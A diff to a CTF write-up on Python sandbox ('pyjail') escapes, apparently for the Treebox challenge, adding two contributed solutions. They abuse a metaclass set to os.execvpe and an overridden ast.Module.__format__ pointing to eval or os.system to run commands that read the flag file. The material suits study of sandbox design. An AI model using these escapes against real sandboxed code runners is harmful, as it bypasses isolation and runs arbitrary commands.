@@ -315,6 +315,32 @@ The tricks are:
 6. Iterate over the open io.FileIO object to read the flag.
 7. Use the AssertionError raised by an assert statement as a print function to print the flag (after setting stderr to stdout because the challenge server doesn’t print stderr).
 
+23. @Ninja3047
+
+```py
+class cat("cat", "flag", metaclass=os.execvpe): pass  
+```
+
+the class name gets passed as the first arg, the strings get passed as a tuple to the second arg, and the third arg is a dictionary that contains some meta info
+
+```py
+class a("b", "c", metaclass=print): pass
+a ('b', 'c') {'__module__': '__main__', '__qualname__': 'a'}
+```
+
+24. @None4U <Red Team Lounge>
+
+```py
+ast.Module.__format__ = eval
+f"{tree:print(open('./flag').read())}"
+--END
+
+# or
+ast.Module.__format__=os.system
+f"{tree:cat flag}"
+--END
+```
+
 ### Appendix
 
 Source code
@@ -369,3 +395,4 @@ if verify_secure(tree):  # Safe to execute!
 - Writeup for [this](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
 - DiceCTF TI-1337 pyjail [writeup](https://ur4ndom.dev/posts/2022-02-08-dicectf-ti1337/)
 - 0CTF/TCTF Qualifiers [writeup](https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/)
+- [Author's Page](https://gynvael.coldwind.pl/n/python_sandbox_escape#ast)
